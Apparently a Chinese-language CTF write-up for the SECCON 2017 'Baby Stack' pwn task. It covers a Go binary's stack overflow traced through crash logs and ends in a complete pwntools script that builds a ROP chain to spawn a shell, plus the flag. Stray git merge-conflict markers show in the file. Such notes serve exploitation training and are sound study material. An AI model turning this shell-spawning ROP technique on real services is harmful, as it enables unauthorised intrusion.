# SECCON CTF Quals 2017 - Notes

<<<<<<< HEAD
=======
## Baby Stack

[參考](https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/)

保護只開 DEP 的 x64 題目，然後是 static linked

然後丟到 ida pro 不可以 f5 ，把一堆函數中的一個 runtime_memhash0

丟去 google 知道該程式是 go 語言寫的

用 ida pro 看 memcpy 可以看到有 overflow
```
; void __cdecl main_memcpy(uintptr dst, uintptr src, __int64 len)
public main_memcpy
main_memcpy proc near

dst= qword ptr  8
src= qword ptr  10h
len= qword ptr  18h

mov     rsi, [rsp+len]
mov     rdx, [rsp+dst]
mov     rcx, [rsp+src]
xor     eax, eax
cmp     rax, rsi
jge     short locret_401521
```

執行程式，一開始會要我們輸入 name 之後輸入 msg 

name 那邊沒 overflow ， msg 有，但是不是 segmentation fault

錯誤訊息是
```
root@lubun:/tmp/p# ./vul 
Please tell me your name >> a
Give me your message >> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA
unexpected fault address 0x0
fatal error: fault
[signal 0xb code=0x80 addr=0x0 pc=0x456551]

goroutine 1 [running]:
runtime.throw(0x507550, 0x5)
        /usr/lib/go-1.6/src/runtime/panic.go:547 +0x90 fp=0xc82003d5b8 sp=0xc82003d5a0
runtime.sigpanic()
        /usr/lib/go-1.6/src/runtime/sigpanic_unix.go:27 +0x2ab fp=0xc82003d608 sp=0xc82003d5b8
runtime.memmove(0xc82008c00b, 0x6941414d41413741, 0x4141)
        /usr/lib/go-1.6/src/runtime/memmove_amd64.s:83 +0x91 fp=0xc82003d610 sp=0xc82003d608
fmt.(*fmt).padString(0xc82006ebb8, 0x6941414d41413741, 0x4141)
        /usr/lib/go-1.6/src/fmt/format.go:130 +0x456 fp=0xc82003d730 sp=0xc82003d610
fmt.(*fmt).fmt_s(0xc82006ebb8, 0x6941414d41413741, 0x4141)
        /usr/lib/go-1.6/src/fmt/format.go:322 +0x61 fp=0xc82003d760 sp=0xc82003d730
fmt.(*pp).fmtString(0xc82006eb60, 0x6941414d41413741, 0x4141, 0xc800000073)
        /usr/lib/go-1.6/src/fmt/print.go:521 +0xdc fp=0xc82003d790 sp=0xc82003d760
fmt.(*pp).printArg(0xc82006eb60, 0x4c1c00, 0xc82000a380, 0x73, 0x0, 0x0)
        /usr/lib/go-1.6/src/fmt/print.go:797 +0xd95 fp=0xc82003d918 sp=0xc82003d790
fmt.(*pp).doPrintf(0xc82006eb60, 0x5220a0, 0x18, 0xc82003dea8, 0x2, 0x2)
        /usr/lib/go-1.6/src/fmt/print.go:1238 +0x1dcd fp=0xc82003dca0 sp=0xc82003d918
fmt.Fprintf(0x7fc637e951e8, 0xc82002a010, 0x5220a0, 0x18, 0xc82003dea8, 0x2, 0x2, 0x40beee, 0x0, 0x0)
        /usr/lib/go-1.6/src/fmt/print.go:188 +0x74 fp=0xc82003dce8 sp=0xc82003dca0
fmt.Printf(0x5220a0, 0x18, 0xc82003dea8, 0x2, 0x2, 0x20, 0x0, 0x0)
        /usr/lib/go-1.6/src/fmt/print.go:197 +0x94 fp=0xc82003dd50 sp=0xc82003dce8
main.main()
        /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x45e fp=0xc82003df50 sp=0xc82003dd50
runtime.main()
        /usr/lib/go-1.6/src/runtime/proc.go:188 +0x2b0 fp=0xc82003dfa0 sp=0xc82003df50
runtime.goexit()
        /usr/lib/go-1.6/src/runtime/asm_amd64.s:1998 +0x1 fp=0xc82003dfa8 sp=0xc82003dfa0

```

會這樣是因為並沒真正蓋到 ret ，用 gdb 可以看到

```
=> 0x401459 <main.main+1113>:   call   0x45ac40 <fmt.Printf>
   0x40145e <main.main+1118>:   add    rsp,0x1f8
   0x401465 <main.main+1125>:   ret    
```

這邊印出謝謝後就立即結束了，然後輸入太長會在 fmt.Printf 這邊 crash

重新執行看一下
```
root@lubun:/tmp/p# ./vul
Please tell me your name >> a
Give me your message >> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
unexpected fault address 0x0
fatal error: fault
[signal 0xb code=0x80 addr=0x0 pc=0x4567ff]

goroutine 1 [running]:
runtime.throw(0x507550, 0x5)
        /usr/lib/go-1.6/src/runtime/panic.go:547 +0x90 fp=0xc820037c60 sp=0xc820037c48
runtime.sigpanic()
        /usr/lib/go-1.6/src/runtime/sigpanic_unix.go:27 +0x2ab fp=0xc820037cb0 sp=0xc820037c60
runtime.memmove(0xc8200101a0, 0x6161616161616161, 0x20)

```

所以先算算 printf 的參數地址的 offset 是 104

所以需要先填一個合法地址

所以總結一下過程就是，目的是要可以執行到 ret 那邊並且 segmentation fault 

所以一開始要把兩次 printf 的參數值算好，這樣就會到 ret 那邊並算好 offset 

之後就是構造 ropchain

```
#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
# r = remote('127.0.0.1',1234)
r = remote('baby_stack.pwn.seccon.jp', 15285)
pop_rax_ret = 0x00000000004016ea
pop_rsi_ret = 0x000000000046defd
pop_rdi_ret = 0x0000000000470931
pop_rdx_ret = 0x00000000004a247c
mov_drdi_rax= 0x0000000000456499
syscall_ret = 0x0000000000456889
bss = 0x005a0000+0x200
ropchain = [pop_rax_ret, bss, pop_rdi_ret, bss, pop_rax_ret, '/bin/sh\x00', mov_drdi_rax]
ropchain+= [pop_rax_ret, bss, pop_rdx_ret, 0, pop_rsi_ret, 0, pop_rax_ret, 0x3b, syscall_ret]


pay1 = 'a'*104 + p64(0xc820010140) + p64(6)
pay2 = 'a'*80 + p64(0xc820010140) + p64(6)
pay3 = 'a'*192 + flat(ropchain)
r.sendlineafter('>> ','a')
r.sendlineafter('>> ',pay1+pay2+pay3)

r.interactive()

## SECCON{'un54f3'm0dul3_15_fr13ndly_70_4774ck3r5}

```


## election
>>>>>>> 1659d1ca59f53ca6cc3ea262efbd10caaaebae73
